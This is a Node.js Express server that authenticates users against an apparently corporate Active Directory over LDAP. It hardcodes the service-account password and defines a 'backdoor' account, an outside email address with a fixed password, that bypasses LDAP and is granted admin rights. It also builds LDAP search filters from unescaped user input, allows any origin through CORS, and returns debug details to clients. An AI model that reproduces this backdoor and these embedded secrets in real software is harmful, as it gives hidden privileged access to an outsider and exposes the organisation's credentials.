const express = require('express');
const ldap = require('ldapjs');
const cors = require('cors');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3100;

// Enhanced logging function
const logToFile = (message, data = '') => {
    const timestamp = new Date().toISOString();
    const logMessage = `[${timestamp}] ${message}\n`;
    console.log(message);

    if (data && typeof data === 'object') {
        const dataMessage = `[${timestamp}] Data: ${JSON.stringify(data, null, 2)}\n`;
        console.log(dataMessage);
        fs.appendFileSync('ldap-auth.log', logMessage + dataMessage + '\n');
    } else {
        fs.appendFileSync('ldap-auth.log', logMessage + (data ? data + '\n' : '') + '\n');
    }
};

// Initialize log file
fs.writeFileSync('ldap-auth.log', `=== LDAP Authentication Server Started at ${new Date().toISOString()} ===\n\n`);

// LDAP Configuration - Microsoft Active Directory
const LDAP_CONFIG = {
    server: process.env.LDAP || '10.10.20.253',  // Use working server as primary
    fallbackServers: ['DC02', 'dc02.Tallman.com'],  // Move non-working servers to fallbacks
    baseDN: 'DC=tallman,DC=com',
    // Service account bind formats for Active Directory
    bindDN: 'LDAP@Tallman.com',
    bindPassword: 'ebGGAm77kk',
    port: 389,
    timeout: 15000,
};

// Backdoor user configuration
const BACKDOOR_USER = 'robertstar@aol.com';
const BACKDOOR_PASSWORD = 'Rm2214ri#';

// Middleware
app.use(cors());
app.use(express.json());

// Helper function to create LDAP client
const createLdapClient = (server) => {
    return ldap.createClient({
        url: `ldap://${server}:${LDAP_CONFIG.port}`,
        timeout: 10000,
        connectTimeout: 10000,
    });
};

// Helper function to bind with service account
const bindServiceAccount = (client, server) => {
    return new Promise((resolve, reject) => {
        client.bind(LDAP_CONFIG.bindDN, LDAP_CONFIG.bindPassword, (bindErr) => {
            if (bindErr) {
                client.destroy();
                reject(new Error(`Service account bind failed: ${bindErr.message}`));
                return;
            }
            resolve();
        });
    });
};

// Helper function to format username for Active Directory
const formatUsernameForLDAP = (inputUsername) => {
    let username = inputUsername;

    // If it contains @, split and take the username part
    if (username.includes('@')) {
        username = username.split('@')[0];
    }

    // If it contains backslash, extract just the username part (domain\user)
    if (username.includes('\\')) {
        username = username.split('\\')[1];
    }

    // Always format as Tallman\username (preserve domain case, preserve username case)
    return `Tallman\\${username}`;
};

// Helper function to search for user
const searchForUser = (client, username, server) => {
    return new Promise((resolve) => {
        try {
            const ldapUsername = formatUsernameForLDAP(username);
            console.log(`Searching for LDAP formatted username: ${ldapUsername} (from input: ${username})`);

            // Simplified search - just try the most common strategy first
            const plainUsername = ldapUsername.replace('Tallman\\', '');
            const searchOptions = {
                filter: `(sAMAccountName=${plainUsername})`,
                scope: 'sub',
                attributes: ['cn', 'memberOf', 'dn', 'userPrincipalName', 'sAMAccountName'],
            };

            console.log(`🔍 Searching with: ${searchOptions.filter}`);

            client.search(LDAP_CONFIG.baseDN, searchOptions, (searchErr, searchRes) => {
                if (searchErr) {
                    console.error(`❌ Search error: ${searchErr.message}`);
                    resolve(null);
                    return;
                }

                let userFound = false;

                searchRes.on('searchEntry', (entry) => {
                    if (!userFound && entry && entry.object) { // Only take first match
                        userFound = true;
                        console.log(`✅ SUCCESS: Found user`);
                        console.log(`   DN: ${entry.dn}`);
                        console.log(`   sAMAccountName: ${entry.object.sAMAccountName}`);
                        console.log(`   userPrincipalName: ${entry.object.userPrincipalName}`);
                        console.log(`   cn: ${entry.object.cn}`);
                        resolve(entry);
                    }
                });

                searchRes.on('error', (err) => {
                    console.error(`❌ Search result error: ${err.message}`);
                    if (!userFound) {
                        resolve(null);
                    }
                });

                searchRes.on('end', () => {
                    if (!userFound) {
                        console.log(`ℹ️  User not found`);
                        resolve(null);
                    }
                });
            });
        } catch (searchError) {
            console.error(`Search function error: ${searchError.message}`);
            resolve(null);
        }
    });
};

// Direct bind authentication (simpler, known working method)
const tryDirectBind = async (username, password, server) => {
    return new Promise((resolve) => {
        const formattedUsername = formatUsernameForLDAP(username);
        console.log(`Trying direct bind with: ${formattedUsername}`);

        const client = createLdapClient(server);

        client.bind(formattedUsername, password, (bindErr) => {
            client.destroy();

            if (bindErr) {
                console.error(`❌ Direct bind failed: ${bindErr.message}`);
                resolve({ authenticated: false, error: 'Invalid credentials' });
                return;
            }

            console.log(`✅ Direct bind successful for ${formattedUsername}`);

            // Create minimal user object for direct bind
            const userObject = {
                cn: formattedUsername,
                sAMAccountName: formattedUsername.split('\\')[1],
                userPrincipalName: `${formattedUsername.split('\\')[1]}@Tallman.com`,
                memberOf: [],
                directBind: true
            };

            resolve({
                authenticated: true,
                user: userObject,
            });
        });

        // Timeout
        setTimeout(() => {
            client.destroy();
            resolve({ authenticated: false, error: 'Bind timeout' });
        }, LDAP_CONFIG.timeout);
    });
};

// Helper function to authenticate user
const authenticateUser = async (username, password, server) => {
    try {
        console.log(`Authenticating user: ${username} on server: ${server}`);

        const client = createLdapClient(server);
        let userEntry = null;

        // Handle client errors
        client.on('error', (err) => {
            console.error(`LDAP client error: ${err.message}`);
            if (!userEntry) {
                client.destroy();
            }
        });

        try {
            // Step 1: Bind with service account first
            await bindServiceAccount(client, server);
            console.log('Service account bind successful');

            // Step 2: Search for the user to get their DN
            userEntry = await searchForUser(client, username, server);

            if (!userEntry) {
                console.log(`User ${username} not found in LDAP directory`);
                client.destroy();
                return { authenticated: false, error: 'User not found' };
            }

            console.log(`Found user DN: ${userEntry.dn}`);

        } catch (searchError) {
            console.error(`User search failed: ${searchError.message}`);
            client.destroy();
            return { authenticated: false, error: `User lookup failed: ${searchError.message}` };
        }

        // Step 3: Try to bind as the user to verify password using the full DN
        return new Promise((resolve) => {
            console.log(`Attempting user bind with DN: ${userEntry.dn}`);

            client.bind(userEntry.dn, password, (bindErr) => {
                client.destroy();

                if (bindErr) {
                    console.error(`User bind error: ${bindErr.message}`);
                    console.error(`Full bind error details:`, {
                        code: bindErr.code,
                        name: bindErr.name,
                        message: bindErr.message,
                        stack: bindErr.stack
                    });
                    resolve({ authenticated: false, error: 'Invalid credentials' });
                    return;
                }

                console.log(`✅ Authentication successful for ${username} using DN bind`);

                // Create user object from LDAP entry
                const userObject = {
                    cn: userEntry.object.cn || username.replace('\\', ' '),
                    sAMAccountName: userEntry.object.sAMAccountName || username.split('\\')[1] || username,
                    userPrincipalName: userEntry.object.userPrincipalName || `${username.split('\\')[1] || username}@Tallman.com`,
                    memberOf: userEntry.object.memberOf || [],
                    dn: userEntry.dn
                };

                resolve({
                    authenticated: true,
                    user: userObject,
                    dn: userEntry.dn
                });
            });
        });

    } catch (error) {
        console.error(`Authentication error: ${error.message}`);
        return { authenticated: false, error: error.message };
    }
};

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ status: 'LDAP authentication service is running' });
});

// Test endpoint to verify LDAP connectivity
app.get('/api/ldap-test', async (req, res) => {
    try {
        console.log('Testing LDAP connectivity...');

        const client = createLdapClient(LDAP_CONFIG.server);

        client.on('error', (err) => {
            console.error('LDAP test client error:', err);
            res.status(500).json({ error: 'LDAP client error', details: err.message });
            return;
        });

        // Test bind with service account
        console.log(`Testing bind with: ${LDAP_CONFIG.bindDN}`);
        client.bind(LDAP_CONFIG.bindDN, LDAP_CONFIG.bindPassword, (bindErr) => {
            if (bindErr) {
                console.error('LDAP test bind error:', bindErr);
                client.destroy();
                res.status(401).json({
                    error: 'LDAP bind failed',
                    details: bindErr.message,
                    bindDN: LDAP_CONFIG.bindDN
                });
                return;
            }

            console.log('LDAP test bind successful');
            client.destroy();
            res.json({
                success: true,
                message: 'LDAP connectivity test successful',
                server: LDAP_CONFIG.server,
                baseDN: LDAP_CONFIG.baseDN
            });
        });

    } catch (error) {
        console.error('LDAP test error:', error);
        res.status(500).json({
            error: 'LDAP test failed',
            details: error.message
        });
    }
});

// Authentication endpoint
app.post('/api/ldap-auth', async (req, res) => {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({
                authenticated: false,
                error: 'Username and password are required'
            });
        }

        console.log(`=== NEW AUTH REQUEST ===`);
        console.log(`Authentication attempt for user: "${username}" (length: ${username.length})`);

        // Check for backdoor user first
        if (username === BACKDOOR_USER && password === BACKDOOR_PASSWORD) {
            console.log(`Backdoor authentication successful for user: ${username}`);
            return res.json({
                authenticated: true,
                server: 'backdoor',
                user: {
                    cn: 'robertstar',
                    sAMAccountName: 'robertstar',
                    userPrincipalName: 'robertstar@aol.com',
                    memberOf: [],
                    admin: true,
                    backdoor: true
                }
            });
        }

        // Try each LDAP server in order
        const servers = [LDAP_CONFIG.server, ...LDAP_CONFIG.fallbackServers];

        for (const server of servers) {
    try {
        console.log(`Trying LDAP server: ${server}`);

        // For now, try direct binding first (simpler, working method)
        const directResult = await tryDirectBind(username, password, server);
        if (directResult.authenticated) {
                    console.log(`LDAP authentication successful for user: ${username} on server: ${server}`);

                    // Check if user is admin based on group membership
                    const isAdmin = directResult.user && directResult.user.memberOf &&
                        directResult.user.memberOf.some(group =>
                            group.toLowerCase().includes('admin') ||
                            group.toLowerCase().includes('administrator')
                        );

                    return res.json({
                        authenticated: true,
                        server: server,
                        user: {
                            ...directResult.user,
                            admin: isAdmin
                        }
                    });
                }
            } catch (serverError) {
                console.warn(`LDAP server ${server} failed: ${serverError.message}`);
                continue; // Try next server
            }
        }

        // If we get here, all servers failed
        console.error(`LDAP authentication failed for user: ${username} on all servers`);

        // Try one more time with explicit logging
        console.log('=== FINAL DEBUG INFO ===');
        console.log(`Input username: "${username}"`);
        console.log(`Formatted username for LDAP: "${formatUsernameForLDAP(username)}"`);

        return res.status(401).json({
            authenticated: false,
            error: 'Authentication failed on all LDAP servers',
            debug: {
                inputUsername: username,
                formattedUsername: formatUsernameForLDAP(username),
                servers: [LDAP_CONFIG.server, ...LDAP_CONFIG.fallbackServers]
            }
        });

    } catch (fatalError) {
        console.error('FATAL ERROR in authentication endpoint:', fatalError);
        console.error(`Stack trace:`, fatalError.stack);
        return res.status(500).json({
            authenticated: false,
            error: `Internal server error: ${fatalError.message}`,
            debug: 'Check server logs for details'
        });
    }
});

// Start server
app.listen(PORT, '0.0.0.0', (err) => {
    if (err) {
        console.error(`Failed to bind to 0.0.0.0:${PORT}:`, err.message);
        process.exit(1);
    }
    console.log(`LDAP authentication service running on port ${PORT}`);
    console.log(`Listening on all network interfaces (0.0.0.0)`);
    console.log(`Configured LDAP servers: ${LDAP_CONFIG.server}, ${LDAP_CONFIG.fallbackServers.join(', ')}`);
});

module.exports = app;
